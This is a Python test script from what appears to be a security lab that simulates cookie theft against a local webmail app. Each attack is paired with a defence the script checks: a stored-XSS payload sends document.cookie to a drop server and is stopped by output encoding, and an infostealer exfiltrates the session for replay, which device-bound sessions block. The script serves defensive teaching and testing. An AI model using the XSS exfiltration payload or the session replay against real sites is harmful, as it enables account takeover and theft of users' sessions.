"""
Phase 3 proof — cookie-theft variants (no AiTM proxy involved).

  Variant 1 (XSS): a stored-XSS payload runs in the victim's browser and reads
    document.cookie. The HttpOnly session is invisible to it; only a careless
    non-HttpOnly cookie leaks. Output-encoding (XSS-safe mode) neutralises the payload.
  Variant 2 (infostealer): malware reads the browser cookie STORE directly — HttpOnly
    does not help — and the session is replayed to take over. A device-bound session
    (DBSC) makes the copied cookie useless off the victim's machine.

Invoked by scripts/cookie_theft_test.sh (KingMail + console must be up; node required).
"""
import json
import os
import subprocess
import sys
import tempfile

import httpx
import pyotp

KM = os.environ.get("KINGMAIL_URL", "http://localhost:8081")
CONSOLE = os.environ.get("CONSOLE_URL", "http://localhost:9000")
ROOT = os.environ["KINGNET_ROOT"]
USER, PW, TOTP = "victim@kingmail.lab", "Summer2026!", "JBSWY3DPEHPK3PXP"
ok_all = True


def check(cond, msg):
    global ok_all
    print(("  \033[1;32m✓\033[0m " if cond else "  \033[1;31m✗\033[0m ") + msg)
    if not cond:
        ok_all = False


def fresh_login():
    c = httpx.Client(timeout=15, follow_redirects=True)
    c.post(f"{KM}/login", data={"email": USER, "password": PW})
    c.post(f"{KM}/otp", data={"code": pyotp.TOTP(TOTP).now()})
    return c


def stolen_items():
    return httpx.get(f"{CONSOLE}/stolen", timeout=15).json()["items"]


def run_browser(inbox_html, doc_cookie):
    with tempfile.NamedTemporaryFile("w", suffix=".html", delete=False) as f:
        f.write(inbox_html)
        path = f.name
    subprocess.run(["node", os.path.join(ROOT, "scripts", "_xss_browser.js"), path, doc_cookie],
                   check=False, capture_output=True, timeout=20)
    os.unlink(path)


# ===================== Variant 1: XSS =====================
print("\n== Variant 1 — stored XSS reads document.cookie ==")
v = fresh_login()
session_val = v.cookies.get("kingmail_session")
prefs_val = v.cookies.get("kingmail_prefs")
check(session_val and prefs_val, "victim has an HttpOnly session + a non-HttpOnly prefs cookie")

payload = "<script>fetch('%s/steal?src=xss&c='+encodeURIComponent(document.cookie))</script>" % CONSOLE
v.post(f"{KM}/status", data={"status": payload})
inbox = v.get(f"{KM}/inbox").text
check("<script>" in inbox, "payload is reflected UNescaped (stored XSS present)")

before = len(stolen_items())
run_browser(inbox, f"kingmail_prefs={prefs_val}")   # browser exposes only non-HttpOnly cookies
xss = [i for i in stolen_items() if i.get("src") == "xss"]
check(len(stolen_items()) > before and xss, "the XSS exfiltrated something to the drop server")
leaked = xss[0]["data"] if xss else ""
check(prefs_val.split(";")[0] in leaked, "it leaked the non-HttpOnly prefs cookie")
check(session_val not in leaked, "but the HttpOnly session was INVISIBLE to the XSS ✅")

print("\n== Variant 1 defense — output encoding (XSS-safe mode) ==")
httpx.post(f"{KM}/admin/xss-safe", json={"safe": True}, timeout=15)
inbox2 = v.get(f"{KM}/inbox").text
check("<script>" not in inbox2 and "&lt;script&gt;" in inbox2, "payload is now escaped, not executable")
before2 = len(stolen_items())
run_browser(inbox2, f"kingmail_prefs={prefs_val}")
check(len(stolen_items()) == before2, "no script ran, nothing exfiltrated")
httpx.post(f"{KM}/admin/xss-safe", json={"safe": False}, timeout=15)

# ===================== Variant 2: infostealer =====================
print("\n== Variant 2 — infostealer reads the cookie STORE (HttpOnly can't stop it) ==")
v2 = fresh_login()
sess2 = v2.cookies.get("kingmail_session")
store = [{"name": "kingmail_session", "value": sess2, "httpOnly": True},
         {"name": "kingmail_prefs", "value": v2.cookies.get("kingmail_prefs"), "httpOnly": False}]
with tempfile.NamedTemporaryFile("w", suffix=".json", delete=False) as f:
    json.dump(store, f)
    store_path = f.name
subprocess.run([sys.executable, os.path.join(ROOT, "scripts", "stealer.py"), store_path],
               check=False, capture_output=True, timeout=20, env={**os.environ, "CONSOLE_URL": CONSOLE})
os.unlink(store_path)
theft = [i for i in stolen_items() if i.get("src") == "infostealer"]
check(theft and sess2 in theft[0]["data"], "infostealer exfiltrated the HttpOnly session ✅")

print("   replaying the stolen session from the attacker's machine…")
atk = httpx.Client(timeout=15, follow_redirects=False,
                   headers={"User-Agent": "stealer-replay/1.0", "X-Lab-Geo": "Amsterdam, NL"},
                   cookies={"kingmail_session": sess2})
r = atk.get(f"{KM}/inbox")
check(r.status_code == 200 and "Wire approval" in r.text, "stolen session = full account takeover")

print("\n== Variant 2 defense — device-bound session (DBSC) ==")
httpx.post(f"{KM}/admin/bind-policy", json={"bind": True}, timeout=15)
dev = v2.post(f"{KM}/device/bind").json()["device_key"]   # key stays on the victim's device
r_victim = v2.get(f"{KM}/inbox", headers={"X-Device-Key": dev})
check(r_victim.status_code == 200 and "Wire approval" in r_victim.text, "real device (with key) still works")
r_atk = atk.get(f"{KM}/inbox")   # attacker has the cookie but NOT the device key
check(r_atk.status_code != 200 or "Wire approval" not in r_atk.text,
      f"copied cookie is now useless without the device key (HTTP {r_atk.status_code})")
httpx.post(f"{KM}/admin/bind-policy", json={"bind": False}, timeout=15)

print("\nRESULT:", "PASS" if ok_all else "FAIL")
sys.exit(0 if ok_all else 1)
